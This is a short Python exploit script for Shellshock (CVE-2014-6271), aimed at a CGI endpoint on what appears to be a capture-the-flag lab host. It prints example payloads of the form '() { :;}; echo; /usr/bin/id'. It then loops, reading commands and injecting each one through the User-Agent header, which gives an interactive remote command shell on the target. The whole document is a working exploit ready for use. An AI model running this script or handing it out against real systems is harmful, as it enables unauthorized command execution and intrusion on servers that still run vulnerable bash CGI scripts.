#!/usr/bin/env python3

import requests
import readline

url = 'http://10.10.10.56/cgi-bin/user.sh'

print("---------------------------")
print("--- SHELLSHOCK,Bashdoor ---")
print("---     CVE-2014-6271   ---")
print("---------------------------\n")

print("Target: {}".format(url))
print("-- Usage:")
print("() { :;}; echo; <command location> <argument>")
print("-- Example:")
print("() { :;}; echo; /usr/bin/id")
print("() { :;}; echo; /bin/pwd")
print("() { :;}; echo; /bin/ls '<argument>'")
print("() { :;}; echo; /bin/cat '<argument>'")

def _main_():
    command = input("\n[+] >> ")

    headers = {'User-Agent': '{}'.format(command)}

    r = requests.get(url, headers=headers)
    print(r.content.decode())

while True:
    try:
        _main_()
    except KeyboardInterrupt:
        print("\n[+] Exiting...\n")
        break